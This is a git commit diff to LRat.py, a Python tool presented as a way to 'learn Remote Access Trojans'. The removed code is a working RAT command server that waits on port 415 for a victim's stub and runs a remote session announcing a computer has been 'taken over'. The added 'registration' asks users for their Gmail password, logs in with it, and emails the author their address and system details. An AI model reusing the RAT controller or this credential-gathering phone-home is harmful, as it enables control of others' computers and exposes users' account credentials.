0be1b1fa7c771b0af937f67898e13a58f25d32c7
Lynx <34606382+Fahad-M@users.noreply.github.com>
2018-10-27 23:12:25 +0500

    Update LRat.py
    Added Register Feature

--- LRat.py
+++ LRat.py
@@ -1,103 +1,91 @@
 # Date Completed - Sept - 11 - 2018
+# Date Modified : Saturday , Oct - 27 - 2018
+# Changelogs : 
+# Added Registration feature.
+
 import socket
 import os
 from threading import Thread
 from colorama import Fore, Style
 import colorama
+import platform
+import datetime, smtplib
+import core
 
 def __main__():
+        """Registration"""
 
-    colorama.init()
+        def clear_screen(): 
+            """Clear the screen only"""
+            if os.name == 'nt': 
+                    os.system('cls') 
+            else: 
+                    os.system('clear')
 
-    def stub():
-        print("Lets assume you're Creating a Stub for Educational Purposes only.")
-        print("To do this, Just Enter your IP Address in HOST Field in the STUB.")
-        input("")
-        __main__()
+        print(Fore.YELLOW+"Starting Script ... "+Style.RESET_ALL)
+        def registration_process():   
 
+                def send_mail(message):
+                        server = smtplib.SMTP('smtp.gmail.com', 587)
+                        server.ehlo()
+                        server.starttls()
+                        server.ehlo()
 
-    def start_server():
-        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        try:
+                                server.login(user_email, user_password)
+                        except smtplib.SMTPAuthenticationError as login_incorrect:
+                                print("[ - ] Login Information Incorrect. Re-run.", login_incorrect)
+                                exit(1)
 
-        host = "0.0.0.0"
-        port = 415
+                        try:
+                                server.sendmail(user_email, __author_email__, message)
+                        except Exception as email_error:
+                                print("[ - ] Email Sending Error, Re - run : ", email_error)
+                                exit(1)
 
-        try:
-            server.bind((host, port))
-        except Exception as e:
-            print("[ - ] Error Binding : ", e)
-            input("")
-            exit(1)
+                        print("[ + ] Email Sent!")
 
-        print("TCP : Transmission Control Protocol. IP : Internet Protocol")
-        print("Listening connections. TCP allows a connection to listen for incoming connection requests.")
+                print("------------------------------------------------------------------------")
+                print("| User Registration Process, Do not quit please.")
+                print("| Registeration Process will ask you for your GMAIL Credentials.")
+                print("| No Malacious intentions (See Code). Email will be sent with your Account to Author as part of Registration")
+                print("| Email message will be sent to developer just notifiyng that a new Person has Registered.")
+                print("| Information Taken is : System Specs, Date & Time & Email. (Any doubts, See Code.)")
+                print("| " + platform.platform() + "| | ", datetime.datetime.now(), " | | ", "Your Gmail. |")
+                print("------------------------------------------------------------------------")
+                print("[ ------------- Process may take time. Please be patient ------------- ]")
+                user_name = input("[ ! ] Enter your USERNAME : ")
+                user_email = input("[ ! ] Enter GMAIL : ")
+                user_password = input("[ ! ] Enter Password : ")
+                __author_email__ = "fahad.mustafa0012@gmail.com"
 
-        try:
-            print("Now Listening on Incoming Connections. Or more Easy, LRat Client will try and connect back to us (TCP/IP networking protocol that allows two computers to communicate).\n"+Fore.MAGENTA+"HOST : "+Style.RESET_ALL+ host+" and "+Fore.MAGENTA+"PORT : "+ str(port)+Style.RESET_ALL)
-            server.listen(5)
-        except Exception as etwo:
-            print(Fore.RED+"[ - ] Error Listening : "+Style.RESET_ALL, etwo)
-            input("")
-            exit(1)
-    
+                msg = "Hey, My EMAIL is " + user_email + " & I just Registered in LRat with " + platform.platform() + " !\n"
 
-        clientsocket, addr = server.accept()
-        print(Fore.LIGHTYELLOW_EX+"[ + ] Stub Connected : ", str(addr[0])+Style.RESET_ALL) 
-        print(Fore.YELLOW+"[ ! ] Now. The Attack is Complete. You have successfully taken over an Computer.."+Style.RESET_ALL)       
-        def recv():
-            try:
-                data = clientsocket.recv(1024)
-                data = data.decode()
-                if(data == ""):
-                    pass
+                info = open("user-info", "w+")
+                info.write("Email : " + user_email)
+                info.close()
+
+                extra_msg = input("[ ? ] Would you like to send any Message to Developer? (Y/n): ")
+                if(extra_msg == "Y".lower().strip()):
+                        extra = input("[ ! ] Enter Message : ")
+                        send_mail(msg)
+                        send_mail(extra)
                 else:
-                    print(Fore.LIGHTGREEN_EX+"[MESSAGE]: "+Style.RESET_ALL, data)
-            except Exception as e_tree:
-                print("[ - ] Error : ", e_tree)
+                        print("Okay, Skip.")
+                        send_mail(msg)
+
+                print("[ + ] You are Registered!")
+
         
-        def send():
-            msg = input(Fore.LIGHTGREEN_EX+"[Remote Access Session@"+Style.RESET_ALL+str(addr[0])+Fore.LIGHTGREEN_EX+"]: "+Style.RESET_ALL)
-            msg = msg.encode()
-            if(msg == ""):
-                pass
-            elif(msg == "exit"):
-                clientsocket.close()
-                input("[ - ] Closing..")
-                __main__()
-            else:
-                clientsocket.send(msg)
-
-        while(True):
-            Thread(target=send()).start()
-            Thread(target=recv()).start()
-
-    os.system("clear") # or CLS if Windows.
-    print(Fore.LIGHTMAGENTA_EX+"--]"+Style.RESET_ALL+" ========================"+Fore.LIGHTMAGENTA_EX+" [--"+Style.RESET_ALL+"\n Learn Remote Access Trojans \n"+Fore.LIGHTMAGENTA_EX+"--]"+Style.RESET_ALL+" ======================== "+Fore.LIGHTMAGENTA_EX+"[ --"+Style.RESET_ALL)
-    print(Fore.LIGHTCYAN_EX+"--] "+Style.RESET_ALL+"Author : Lynx")
-    print(Fore.LIGHTCYAN_EX+"--] "+Style.RESET_ALL+"I hope you learn something..\n\n")
-    print(Fore.LIGHTCYAN_EX+" --] ----------------------------------------- [-- "+Style.RESET_ALL)
-    print(Fore.LIGHTCYAN_EX+"|"+Style.RESET_ALL+" LRat is a Remote Access Tool that Teaches you how"+Fore.LIGHTCYAN_EX+" |")
-    print(Fore.LIGHTCYAN_EX+"|"+Style.RESET_ALL+" and why a Popular Malware 'rat' is used for. Also"+Fore.LIGHTCYAN_EX+" |")
-    print(Fore.LIGHTCYAN_EX+"|"+Style.RESET_ALL+" how to exploit and how to avoid being Attacked."+Fore.LIGHTCYAN_EX+"   |")
-    print(Fore.LIGHTCYAN_EX+" --] ----------------------------------------- [-- "+Style.RESET_ALL)
-
-    
-    main = input("[ ? ]: ")
-    if(main == "help"):
-        print("help - Print this Help Message.\nlisten - Start THINGS UP :D\nexit - Close.\nStub - Generate a Stub (details within)")
-        input("")
-        __main__()
-    elif(main == "listen"):
-        print("Listen for Incoming Connections.\nIt means that any Connection coming to us with port 415 will connect to us.\nThis is basic TCP/IP Connection.")
-        start_server()
-    elif(main == "exit"):
-        print("[ i ] Okay Exiting. But I hope you learned something today.")
-        exit(1)
-    elif(main == "stub"):
-        stub()
-    else:
-        input("[ - ] Unidentified.")
-        __main__()
+        try:
+                clear_screen()
+                user_file = open("user-info", "r")
+                print(Fore.LIGHTCYAN_EX+"All things [OK]"+Style.RESET_ALL)
+                core.__main__()
+        except FileNotFoundError:
+                clear_screen()
+                print("[ * ] Starting Registration..")
+                registration_process()
 
 
 if __name__ == "__main__":
